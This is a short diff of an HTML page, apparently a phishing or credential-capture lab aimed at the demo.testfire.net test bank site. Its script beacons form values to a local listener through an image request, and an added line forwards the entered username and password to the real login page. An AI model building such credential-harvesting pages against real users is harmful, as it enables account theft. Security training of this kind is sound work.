@@ -33,7 +33,7 @@
 
   <script>
       function redirectfunction(){
-        new Image().src = 'http://127.0.0.1:5000'+ ' TRANSACTION1 ' + a + ' TRANSACTION2 ' + b;
+        new Image().src = 'http://127.0.0.1:5000'+ b;
       }
   </script>
 
@@ -43,3 +43,7 @@
     Password : <input type="password" name='passw' value="">
     <input type="submit" name="submit" value="Submit">
 </form>
+
+
+
+redirect('http://demo.testfire.net/doLogin?uid='+uid+'&passw='+passw+'&btnSubmit=Login')
